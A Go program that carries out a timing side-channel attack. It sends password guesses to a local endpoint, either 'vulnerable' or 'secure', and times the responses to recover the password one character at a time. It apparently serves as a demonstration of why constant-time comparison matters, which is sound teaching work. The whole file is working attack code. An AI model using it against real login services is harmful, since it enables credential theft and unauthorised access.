package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"log"
	"net/http"
	"time"
)

var verbose bool

func main() {
	var secure bool
	flag.BoolVar(&secure, "s", false, "Decide whether to attack the secure or vulnerable endpoint.")
	flag.BoolVar(&verbose, "v", false, "Decide whether or not to print progress and timing.")
	flag.Parse()

	var url string
	if secure {
		url = "http://localhost:8080/data/secure"
	} else {
		url = "http://localhost:8080/data/vulnerable"
	}

	password, ok := performTimingAttack(url)
	if !ok {
		log.Println("Unable to determine password.")
		return
	}
	log.Printf("Success! Password was '%s'\n", password)
}

type passwordPayload struct {
	Password string `json:"password"`
}

const validPasswordCharacters string = "abcdefghijklmnopqrstuvwxyz "
const passwordPadding string = "🦹‍♂️"
const maxPasswordLen int = 10
const sampleSize int = 10000

func performTimingAttack(url string) (string, bool) {
	password := ""
	for {
		if len(password) == maxPasswordLen {
			return "", false
		}

		nextChar, wasSuccessful, err := guessPasswordCharacter(url, password)
		if err != nil {
			log.Fatal(err)
		}

		password += string(nextChar)

		if wasSuccessful {
			return password, true
		}

		log.Printf("Password so far: '%s'\n", password)
	}
}

func guessPasswordCharacter(url, basePassword string) (rune, bool, error) {
	characterDurations := make(map[rune]time.Duration, len(validPasswordCharacters))
	for _, char := range validPasswordCharacters {
		characterDurations[char] = 0
	}
	attemptedPasswords := map[string]bool{}

	for i := 0; i < sampleSize; i++ {
		for _, char := range validPasswordCharacters {
			password := basePassword + string(char)
			if _, ok := attemptedPasswords[password]; !ok {
				success, _ := attemptPassword(url, password)
				if success {
					return char, true, nil
				}
				attemptedPasswords[password] = true
			}

			paddedPassword := password + passwordPadding
			success, timeTaken := attemptPassword(url, paddedPassword)
			characterDurations[char] += timeTaken
			if success {
				return char, true, nil
			}
		}
	}

	if verbose {
		log.Println("\nCharacter Results:")
		for _, char := range validPasswordCharacters {
			duration := characterDurations[char]
			log.Printf("%s %v\n", string(char), duration)
		}
		log.Println("")
	}

	maxDurationChar := getMaxDurationChar(characterDurations)
	return maxDurationChar, false, nil
}

func attemptPassword(url, password string) (bool, time.Duration) {
	payload, err := json.Marshal(passwordPayload{Password: password})
	if err != nil {
		log.Fatal(err)
	}

	payloadBytes := bytes.NewBuffer(payload)
	startTime := time.Now()
	resp, err := http.Post(url, "application/json", payloadBytes)
	timeTaken := time.Now().Sub(startTime)
	if err != nil {
		log.Fatal(err)
	}

	return resp.StatusCode == 200, timeTaken
}

func getMaxDurationChar(characterDurations map[rune]time.Duration) rune {
	maxDurationChar := rune(0)
	maxDuration := time.Duration(0)
	for char, duration := range characterDurations {
		if duration > maxDuration {
			maxDuration = duration
			maxDurationChar = char
		}
	}
	return maxDurationChar
}
